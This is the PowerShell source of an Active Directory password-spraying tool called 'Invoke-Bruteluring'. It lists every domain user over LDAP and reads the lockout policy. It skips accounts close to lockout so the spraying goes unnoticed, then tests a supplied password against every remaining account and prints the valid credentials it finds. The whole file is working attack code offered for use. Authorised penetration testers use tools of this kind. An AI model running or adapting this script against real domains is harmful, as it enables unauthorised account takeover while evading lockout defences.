Function Test-Cred
{
		Param($username, $password, $domain)
		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
		$ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
		$pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct, $domain)
		$object = New-Object PSObject | Select-Object -Property Username, Password, IsValid
		$object.Username = $username;
		$object.Password = $password;
		$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
		return $object
	}

Function Invoke-Bruteluring{
param($password, [switch]$debug, $targetdomain)



write-host "
 _                 _               _                _       _            _             
(_)               | |             | |              | |     | |          (_)            
 _ _ ____   _____ | | _____ ______| |__  _ __ _   _| |_ ___| |_   _ _ __ _ _ __   __ _ 
| | '_ \ \ / / _ \| |/ / _ \______| '_ \| '__| | | | __/ _ \ | | | | '__| | '_ \ / _` |
| | | | \ V / (_) |   <  __/      | |_) | |  | |_| | ||  __/ | |_| | |  | | | | | (_| |
|_|_| |_|\_/ \___/|_|\_\___|      |_.__/|_|   \__,_|\__\___|_|\__,_|_|  |_|_| |_|\__, |
                                                                                  __/ |
                                                                                 |___/ 

v0.4 viksecurity
"


if ($targetdomain -eq $null ){$targetdomain = $env:userdomain}

$domainFQDN = $targetdomain
$context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$domainFQDN)
try 
    { 
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context) 
    }
catch 
    { 
    Write-Output "[-] Cannot reach domain" $domainFQDN
    break
    }
$pdc=$domain.pdcRoleOwner.name
[int]$maxbad=($([ADSI]"WinNT://$targetdomain").MaxBadPasswordsAllowed).Value
[int]$lockoutobs=($([ADSI]"WinNT://$targetdomain").LockoutObservationInterval).Value

$ldap_format = "DC=" + $domain.name.Replace(".",",DC=")
$domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$pdc/$ldap_format")
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$domaininfo)
$searcher.Filter='(&(objectCategory=Person)(objectClass=User))'
$searcher.CacheResults=$False
$searcher.pageSize=1000;

$users = $searcher.Findall().getdirectoryentry() | ForEach-Object{
    New-Object -TypeName PSCustomObject -Property @{
        samaccountname = $_.samaccountname.ToString()
        badpwdcount = $_.badpwdcount.ToString()
    }
}

write-host "[+] Domain is:" $domainFQDN
write-host "[+] Domain PDC is" $pdc
write-host "[+] Number of users:" $users.count
write-host "[+] Number of passwords:" $password.count
write-host "[+] MaxBadPassword allowed:" $maxbad

#Exclude users with high MaxBadPwd
if ($maxbad -eq 0){
Write-host "[+] No lockout set. Pwning all the things..."
} ELSE {
$usersbefore=$users
$users = $users | where {$_.badpwdcount -le ($maxbad-2) }
Write-host "[!] Removed $($usersbefore.count - $users.samaccountname.count) because observed MaxBadPassword $($maxbad-2) or higher."
}

Write-host "[!] Users left to pwn:" $users.samaccountname.count

$confirmation = Read-Host "Press y to pwn"
if ($confirmation -eq 'y') {
$i = 1

$usersnewcounts = $searcher.Findall().getdirectoryentry() | ForEach-Object{
New-Object -TypeName PSCustomObject -Property @{
    samaccountname = $_.samaccountname.ToString()
    badpwdcount = $_.badpwdcount.ToString()
    }
}

#debug
if ($debug -eq $True){$usersbefore}

write-host ""
foreach ($user in $users){
    #write-host "Testing" $password "on" $username
    write-progress -Activity "Bruteluring in action. Testing $($user.samaccountname)" -status "$i of $($users.samaccountname.Count) done" -PercentComplete (($i / $users.samaccountname.Count) * 100)
    $result = Test-Cred $user.samaccountname $password $pdc
	if ($result | Where {$_.IsValid -eq $True}){ Write-host "pwned!" $result.username"\"$result.Password }
    #get old badpwdcount
    #$oldpwdcount = $($user | where {$_.samaccountname -eq $user.samaccountname}).badpwdcount
    #get new badpwdcount
        $samaccountname = $user.samaccountname
        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$domaininfo)
        $searcher.Filter="(&(objectClass=User)(sAMAccountName=$samaccountname))"
        $searcher.CacheResults=$False
        $userupdated = $searcher.Findall().getdirectoryentry() | ForEach-Object{
        New-Object -TypeName PSCustomObject -Property @{
        samaccountname = $_.samaccountname.ToString()
        badpwdcount = $_.badpwdcount.ToString()
        }
        }
    $oldpwdcount = $user.badpwdcount
    $updpwdcount = $userupdated.badpwdcount

    #debug
    if ($debug -eq $True){write-host $user.samaccountname ":" $oldpwdcount "->" $updpwdcount}
    if ($result | Where {$_.IsValid -eq $False}){ 
        if ($oldpwdcount -eq $updpwdcount){
            if($oldpwdcount -ne $maxbad){
                #write-host "[+]" $user.samaccountname": password history includes $password"
            }
        }
    }

    }
    $i++
    }
    write-host ""
    write-host "[+] Done"
}
